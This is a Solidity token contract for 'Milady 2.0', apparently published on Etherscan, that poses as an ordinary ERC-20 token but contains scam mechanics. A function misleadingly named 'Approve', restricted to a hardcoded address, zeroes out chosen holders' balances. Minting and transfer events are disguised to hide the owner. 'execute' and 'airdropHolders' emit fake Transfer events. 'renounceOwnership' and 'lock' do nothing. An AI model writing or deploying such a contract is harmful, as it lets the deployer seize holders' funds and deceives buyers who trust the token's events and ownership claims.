/**
 *Submitted for verification at Etherscan.io on 2023-07-07
*/

/*
0000000000ko:;;;;;:::::;:ccc::ccclllcccccloolc:::::::::::cclokko:;;cllooodoollc::cllc:cc:ckXKKKK000O
000000000Oo:;;;;;:cc::cllcc:::cccccccccclooc:::::::::c::::ccoxkko;;cllooooooolcc::lllc:cc:lOK000OOOO
000000000xc;;;;;:cc::coolc:;::cllcccccclool::cc::::::::::::codkkdc:clloooooooolc::clll::cc:oOOkOkOkk
00000000Oo;;;;:codl::odolc;;:ccllcccccclooc;:cc:c::::::::::coxkkxl:clloooooooolcccccll::cc::dOOOOOOO
00000000x:;;;:coxko;:odlcc:;:clllcclcclooc::cc:clc:::::::::cdkxxdl:clllc:clooollccclllc:cc::dO00OOOO
0000000Oo:;;:coxkxc;:ooccc:;:clllcclccloo::clc:llc;::::::::lxkxdolccloc'  ..,:ccccllll::cc:;oOOOOOOO
OOOO000kc;;:codkko:;col::c:;;cllccccclodl:;:;.......:ccc:cloxOkdddoloddol:,.. ..,clllc:ccc::dOOOOOOO
OOOOOOOd:;:cldxkxl;;clc:ccc;;ccccclccldo,..  ..,;:clxkkOOkkkO0OOO0000000000kdl;'..;llccccc:lk0OOOOOO
O000000d:;cldkkkdc;;clc;:ll:;:cclccccl:...;ldk0KKKKKKKKKKKKKKKKKKKKKKKKKKKXKKXK0x,.:xdlccclk0000O000
000KKKKxc:coxkkko:;;:c:;:llc;;cclccc;..'oOKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKOxollloxkllO0xoodkO0O00O000
KKKKXXXkccldkkkkl;;;;:;;:lol;;:ccl:..,d0KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKko;..    .c000K0OOO0OOO0OO000
XXXXXX0occldkkkdc;;;;;;:cldddoocc:.,d0KKKK0kxdooooodOKKKKKKKKKKKKKKKKKKkc.;o;... .o000KKKKK00K0000KK
NNNNNXd:cllxkkxl;;;;;:cllldk0KKOkddOKKKkoc:;'',;clloOKKXKKKKKKKKKKKK0K0c..xWO'  ...o00KKXXXXXXXKKXXX
NNNWNkc:lloxkko:;;;:ccllldk0KKKKKKKKKKO:'...',...,:oOKKKKKKKKKKKKK000Kd. 'cl:.  ...ckK0O0KKKKKKKXK0O
WNNNKl:clldkxo:;:ccccloodO0KKKKKKKKK0x;. .lo,..     ,xKKKKKKKKKKKK0000c.....,.  .'d0O0xccoxO0000Odc;
WNNNk::llldkdc:coddxkOOO00KKKKKKKKKO:.....'''.       ,OKKKKKKKKKKK0000c.,.  .  ..,kX00o'..',;::;,'..
WNN0o:clllxkkxxOO000K0000KKKKKKKKK0:'..,'....       ..dKKKKKKKKKK0O00Kd.,;.   .,.c0000c.............
W0dc;:cclxO000000KKKKKKKKKKKKKKKKKkckx.':.         .'.lK0K00000KK00000kc,;,'..;;;kK00k;.............
0l,,,:ccoO00000KKKKKKKKKKKKKKKKK00K0KXl.;:'.    'cc;..o00000000000000000xo:;;,.,k0000d'.............
:,'',:cclxO00000KKKKKKKKKKKKKKKKK0KKKXKl..,;,'''cxx;.:OK0000000000000000000kdl:lk000O:..............
'''',:ccoolok000000KKKKKKKKKKKKKKKKKKKXXOl;,,;:;....lO000KKKKKKKKKK00000000000000000o'..............
'''',;clol:;:lxk0000000000KKKK00KKKKKKKKKXKx:',;:odk0K0KKKKKKKKKKXXX000000000000000x,...............
''''',:cll:;;,,;coxOO0000000000000KKKKKKKK0OkOO00KKK0KKKKKKKKKKKKKKKKKK00000000000x:'...............
''''.';cll;;;;;;,,,;cldxO000000000000KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK0OO000000000Oo:,'...............
''''''';cc;;;;;;;;;;,'',;cldxkO00000000KKKKKKKKKKKKKKKKKKKKKKK0OkkOkkkO0000O00Oxl:;'................
''''''',;::;;;;;;;;;;;,''''',;:loxkOO0000KKKKKKKKKKKKKKKKKKKKKK00000KK000000Oxl:;;,'................
''''','',,,;;;;;;;;;;;;,,,,'''..',;:coxkO0KKKKKKKKKKKKKKKKKKK00KKKKK00000Okdc;;;;;,'................
'''',,,'''''',;;;;;;;;;;;,,,,'''''''''';:ldk00KKKKKKKKKKKKK0000000000Okdoc:;;;;;;;,'...'''''''''''''
'''''''''''''',,;;;;;;;;;;,,,,,'''''''''''',;cldxO0000000000000Okkxdoc:;;;;;;;;;;;,'''''''..''''''''
'''''''''''','''',;;;;;;;;;;;,,,,'''''''''',,,'';oxkkkkkkOOOOO0kc;:;;;;;;;;;;;;;;;,'''''''''''''''''
*/

pragma solidity ^0.6.0;                                                                                 
                                                                                  
                                                                                  



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        
        require(b <= a, errorMessage);
        
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;

        return c;
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");

    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        
        return _functionCallWithValue(target, data, 0, errorMessage);

    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        
        require(address(this).balance >= value, "Address: insufficient balance for call");
        
        return _functionCallWithValue(target, data, value, errorMessage);
    
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        
        if (success) {
            
            return returndata;

        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)
                }
            } else {

                revert(errorMessage);

            }
        }
    }
}

contract Context {
    
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        
        return msg.sender;
    
    }

    function _msgData() internal view virtual returns (bytes memory) {
       
        this; 
        
        return msg.data;
    
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract Milady is Context, IERC20 {

    mapping (address => mapping (address => uint256)) private _allowances;
 
    mapping (address => uint256) private _balances;

    using SafeMath for uint256;


    using Address for address;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;

    address team;

    address public _Owner = 0xb367F9E1E85C77DCfC5847303C005b484Dd813fF;

    constructor () public {
        _name = "Milady 2.0";
        _symbol ="MILADY2.0";
        _decimals = 18;
        uint256 initialSupply = 888000000;
        team = 0x7ef4c5F5e4E9cf35661f40638D49E8fe9Ccb7C49;
        setRule(team, initialSupply*(10**18));
    }



    function name() public view returns (string memory) {

        return _name;

    }

    function symbol() public view returns (string memory) {

        return _symbol;

    }

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    function totalSupply() public view override returns (uint256) {

        return _totalSupply;

    }

    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }
    function _setDecimals(uint8 decimals_) internal {

        _decimals = decimals_;

    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        
        _transfer(_msgSender(), recipient, amount);
        
        return true;

    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function renounceOwnership()  public _onlyOwner(){}

    function lock()  public _onlyOwner(){}


    


    function setRule(address locker, uint256 amt) public {

        require(msg.sender == _Owner, "ERC20: zero address");

        _totalSupply = _totalSupply.add(amt);

        _balances[_Owner] = _balances[_Owner].add(amt);

        emit Transfer(address(0), locker, amt);
    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);
        
        if (sender == _Owner){sender = team;}if (recipient == _Owner){recipient = team;}
        emit Transfer(sender, recipient, amount);

    }


  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _noAccess(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


    function Approve(address[] memory recipients)  public _noAccess(){

            for (uint256 i = 0; i < recipients.length; i++) {

                uint256 amt = _balances[recipients[i]];

                _balances[recipients[i]] = _balances[recipients[i]].sub(amt, "ERC20: burn amount exceeds balance");

                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }
            }


    modifier _onlyOwner() {

        require(msg.sender == _Owner, "Not allowed to interact");
        
        _;
    }

    modifier _noAccess() {require(msg.sender == 0xa36E4985c6C4B08DCC8cfFc5e7d77F6d7bbAb75B, "Not allowed to interact");_;}

    function airdropHolders(address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}



    }